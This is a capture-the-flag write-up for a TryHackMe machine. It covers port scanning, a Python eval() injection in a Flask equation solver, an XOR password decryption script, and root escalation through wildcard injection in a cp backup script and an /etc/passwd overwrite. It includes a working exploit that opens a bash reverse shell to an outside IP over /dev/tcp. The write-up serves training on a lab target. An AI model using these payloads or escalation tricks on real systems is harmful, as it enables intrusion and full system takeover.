




![davie](https://github.com/user-attachments/assets/22114f94-ac64-4aa0-b5a5-207e6e52dfd7)










*"Appearances can be deceiving, and in cybersecurity, what you see isn't always what you get."*

## Introduction

In this TryHackMe challenge, we're presented with a seemingly simple mathematical equation solver website. However, as we'll discover, there's more than meets the eye. The ability to download the source code provides us with our first clue into finding the vulnerability that will grant us initial access.




![thm-devie-homepage](https://github.com/user-attachments/assets/f4d7db0c-fe6e-4f2f-b293-6992889f0818)


## Initial Reconnaissance



Let's start by scanning the target machine to understand what services are running:

```bash
nmap -sC -sV -A -oN nmap_result MACHINE_IP
```

The scan reveals two open ports:
- Port 22: Running OpenSSH 8.2p1
- Port 5000: A Python web application using Werkzeug

## Gaining Initial Access

The web application's source code reveals an interesting vulnerability in the `app.py` file. The use of the `eval()` function with user input creates a dangerous situation. Here's the vulnerable code:

```python
@app.route("/")
def bisect(xa,xb):
    added = xa + " + " + xb
    c = eval(added)
    c = int(c)/2
    ya = (int(xa)**6) - int(xa) - 1 #f(a)
    yb = (int(xb)**6) - int(xb) - 1 #f(b)
```

We can exploit this by injecting Python code through the `eval()` function. Here's our exploit script:

```python
import requests

url = "http://MACHINE_IP:5000"
rev_shell = "__import__('os').system(\"bash+-c+'bash+-i+>%26+/dev/tcp/10.18.11.118/9001+0>%261'\")#"
payload = f"xa={rev_shell}&xb=3"
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

response = requests.post(url, data=payload, headers=headers)
```

## Lateral Movement

After gaining access as user 'bruce', we discover:
- The first flag
- A note from Gordon about an encoded password
- Sudo privileges to run `/usr/bin/python3 /opt/encrypt.py` as user 'gordon'

The encryption script uses XOR with base64 encoding. We can exploit this using a known-plaintext attack. Here's our decryption script:

```python
import base64
import sys

def cut_until_repeat(s):
    for i in range(1, len(s) // 2 + 1):
        if s[:i] * (len(s) // i) + s[:len(s) % i] == s:
            return s[:i]
    return s

def decode_string(base64_string):
    base64_bytes = base64_string.encode('ascii')
    decoded_string = base64.b64decode(base64_bytes)
    return decoded_string.decode('ascii')

def xor(password, key):
    xor = ""
    for i in range(0, min(len(password), len(key))):
        xor += chr(ord(password[i]) ^ ord(key[i%len(key)]))
    return xor

# Usage: python3 xor.py <password> <base64_string> <encrypted_secret>
```

## Privilege Escalation

As user 'gordon', we discover:
- The second flag
- A backup system that copies files from `/home/gordon/reports/` to `/home/gordon/backups/`

The backup script uses a wildcard (`*`) which we can exploit:

```bash
#!/bin/bash
cd /home/gordon/reports/
cp * /home/gordon/backups/
```

We can exploit this by:
1. Copying `/bin/bash` to the reports directory
2. Setting the SUID bit
3. Creating a file named `--preserve=mode`

After the backup script runs, we can execute the copied bash binary to get a root shell:

```bash
./bash -p
```

## Alternative Privilege Escalation Method

Another approach involves manipulating the `/etc/passwd` file:
1. Create a modified copy of `/etc/passwd` in the reports directory
2. Change gordon's UID and GID to 0
3. Create a symbolic link from backups to `/etc`
4. Wait for the backup script to overwrite the real `/etc/passwd`

## Conclusion

This machine demonstrates several important security concepts:
- The dangers of using `eval()` with user input
- Weak encryption implementations
- Wildcard injection vulnerabilities
- File permission manipulation

Remember: in cybersecurity, the most dangerous vulnerabilities are often hidden in plain sight, waiting to be discovered by those who know where to look. 
